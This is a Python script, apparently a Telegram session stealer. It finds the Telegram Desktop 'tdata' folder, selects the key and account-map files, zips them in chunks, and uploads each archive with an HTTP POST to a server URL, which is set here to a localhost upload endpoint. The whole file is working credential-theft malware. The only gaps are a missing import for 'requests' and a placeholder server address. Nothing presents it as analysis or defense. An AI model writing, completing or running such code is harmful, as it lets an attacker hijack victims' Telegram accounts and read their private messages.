import os
import zipfile
import tempfile

SERVER_URL = "http://localhost:8080//upload"
MAX_SIZE = 50 * 1024 * 1024

def find_tdata():
    path = os.path.join(os.getenv("APPDATA", ""), "Telegram Desktop", "tdata")
    return path if os.path.isdir(path) else None

def get_size(file_path):
    try:
        return os.path.getsize(file_path)
    except:
        return 0

def is_essential_file(filename, filepath):
    exclude = ['cache','temp','media_cache','stickers','thumbnails','downloads','user_photos','saved','emoji','export','.lock','.binlog','.journal','.temp','.tmp']
    essential = ['key_datas','key_data','settings','maps','usertag']
    fname = filename.lower()

    if any(x in fname for x in exclude):
        return False
    if get_size(filepath) > 5 * 1024 * 1024:
        return False
    if any(x in fname for x in essential):
        return True
    if filename.isdigit() and len(filename) <= 16:
        return True
    if fname.endswith(('s','map','data')) and get_size(filepath) < 1024 * 1024:
        return True
    return False

def create_archives(src_dir, temp_dir):
    archives = []
    current_files = []
    current_size = 0
    archive_index = 1

    files_list = []
    for root, _, files in os.walk(src_dir):
        for f in files:
            full = os.path.join(root, f)
            if is_essential_file(f, full):
                rel = os.path.relpath(full, src_dir)
                size = get_size(full)
                files_list.append((full, rel, size))
    files_list.sort(key=lambda x: (x[2], x[1]))

    for full, rel, size in files_list:
        if current_size + size > MAX_SIZE and current_files:
            archive_path = os.path.join(temp_dir, f"tdata_{archive_index}.zip")
            with zipfile.ZipFile(archive_path, 'w', compression=zipfile.ZIP_DEFLATED) as zipf:
                for file_full, file_rel in current_files:
                    try:
                        zipf.write(file_full, file_rel)
                    except:
                        pass
            archives.append(archive_path)
            archive_index += 1
            current_files = []
            current_size = 0

        current_files.append((full, rel))
        current_size += size

    if current_files:
        archive_path = os.path.join(temp_dir, f"tdata_{archive_index}.zip")
        with zipfile.ZipFile(archive_path, 'w', compression=zipfile.ZIP_DEFLATED) as zipf:
            for file_full, file_rel in current_files:
                try:
                    zipf.write(file_full, file_rel)
                except:
                    pass
        archives.append(archive_path)

    return archives

def send_zip(zip_path): # send tdata.zip to {SERVER_URL}
    try:
        with open(zip_path, 'rb') as f:
            r = requests.post(SERVER_URL, files={'file': f}, timeout=10)
            return r.status_code == 200
    except Exception as e:
        return False

def main():
    tdata = find_tdata()
    if not tdata:
        return

    with tempfile.TemporaryDirectory() as temp_dir:
        archives = create_archives(tdata, temp_dir)
        for archive in archives:
            ok = send_zip(archive)

if __name__ == "__main__":
    main()
